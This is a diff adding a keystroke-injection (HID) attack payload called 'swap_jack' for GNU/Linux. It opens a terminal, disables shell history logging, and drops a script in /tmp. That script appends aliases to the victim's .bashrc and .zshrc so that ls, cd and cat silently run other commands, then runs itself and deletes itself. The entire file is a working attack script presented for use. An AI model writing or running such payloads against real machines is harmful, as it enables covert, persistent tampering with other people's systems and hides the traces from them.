@@ -1,0 +1,28 @@
+REM Title: swap_jack
+REM Description: swap_jack, simple yet powerful payload which can be used to replace one command with another on target’s system.
+REM AUTHOR: drapl0n
+REM Version: 1.0
+REM Category: Execution.
+REM Target: GNU/Linux.
+REM Attackmodes: HID.
+
+DELAY 2000
+CTRL ALT t
+DELAY 1900
+STRING unset HISTFILE 
+ENTER
+DELAY 200
+STRING echo -e "#\!/bin/bash\n" > /tmp/sys
+ENTER
+DELAY 200
+STRING echo -e "swap_array='alias ls=\"du\" \\nalias cd=\"df\" \\nalias cat=\"lsblk\"'" >> /tmp/sys
+ENTER
+DELAY 200
+STRING echo -e "\n\n\ls -a ~/ | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"\$swap_array\" >> ~/.zshrc\nfi\n\nls -a ~/ | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"\$swap_array\" >> ~/.bashrc\nfi" >> /tmp/sys
+ENTER
+DELAY 200
+STRING chmod +x /tmp/sys
+ENTER
+DELAY 200
+STRING /tmp/./sys && rm /tmp/sys && exit
+ENTER
